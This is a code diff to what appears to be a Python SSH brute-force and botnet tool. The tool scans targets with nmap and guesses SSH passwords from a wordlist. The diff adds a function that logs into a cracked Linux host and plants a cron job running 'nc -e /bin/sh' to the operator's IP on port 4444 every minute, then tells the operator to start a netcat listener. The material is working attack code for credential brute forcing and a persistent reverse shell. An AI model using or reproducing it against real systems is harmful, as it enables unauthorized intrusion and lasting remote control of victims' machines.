@@ -1,6 +1,7 @@
 import nmap
 import optparse
 import time
+import socket
 from sys import argv
 from os import path
 from colorama import init, Fore
@@ -20,12 +21,47 @@ ssh_info = None
 export_file = None
 
 # FONCTIONS
+def get_host_ip():
+    """Get the host's ip"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    host_ip = s.getsockname()[0]
+    s.close()
+
+    return host_ip
+    
+def persist_shell_linux(host):
+    """This fonction set a reverseshell on port 4444 whit crontab on a linux based system"""
+    global ssh_info
+    
+    try:
+        s = pxssh.pxssh()
+        s.login(host, ssh_info['user'], ssh_info['password'])
+        host_ip = get_host_ip()
+
+        crontab_str = f'(crontab -l 2>/dev/null; echo "* * * * * nc -e /bin/sh {host_ip} 4444") | crontab -'
+
+        s.sendline(crontab_str)
+        s.logout()
+
+        print(f"{Fore.BLUE}[Botnet ssh] {Fore.LIGHTGREEN_EX}Reverse shell 60-second intervals is set on port {Fore.MAGENTA}4444. "\
+                f"{Fore.BLUE}Enter the following command : {Fore.YELLOW}nc -lnvp 4444")
+
+    except pxssh.ExceptionPxssh as e:
+        print(f"{Fore.LIGHTRED_EX}[ERROR] Connection failed!")
+
+
 def detect_os(host):
+    """Gess the Os of the target"""
     global os
 
-    nm = nmap.PortScanner()
-    nm.scan(host, arguments="-O --osscan-guess")
-    os = nm[host]['osmatch'][0]['name']
+    try:
+        nm = nmap.PortScanner()
+        nm.scan(host, arguments="-O --osscan-guess")
+        os = nm[host]['osmatch'][0]['name']
+    except nmap.nmap.PortScannerError:
+        print(f"{Fore.LIGHTRED_EX}[ERROR] You need to run the command with root privilege!")
+        exit(0)
 
 
 def verif_file(filename):
@@ -78,8 +114,8 @@ def brute_force_ssh(host):
     # Get the username
     while username == None or ' ' in username:
         username = input(f"{Fore.BLUE}Write the {Fore.MAGENTA}username{Fore.BLUE}: ") 
-    
-    print("\n")
+   
+    print("") # separator of a new line
     try:
         wordlist = open("passwords.lst", "r")
         while True:
@@ -92,7 +128,10 @@ def brute_force_ssh(host):
                 
                 if export_file != None:
                     write_export(ip=host, user=username, password=ssh_info['password'], port=ssh_info['port'])
-
+                
+                # Reverse shell on linux target
+                if "linux" in os.lower():
+                    persist_shell_linux(host)
                 exit(0)
             connect(host, username, psswd)
 
@@ -180,6 +219,8 @@ def main():
     print(f'Os : {os}')
     print("Port(s) : ", end="")
     print(*tgtPorts, sep=', ')
+    print("") # separator of a new line
+
     for port in tgtPorts:
         nmapScan(tgtHost, port)
     if ssh_info != None:
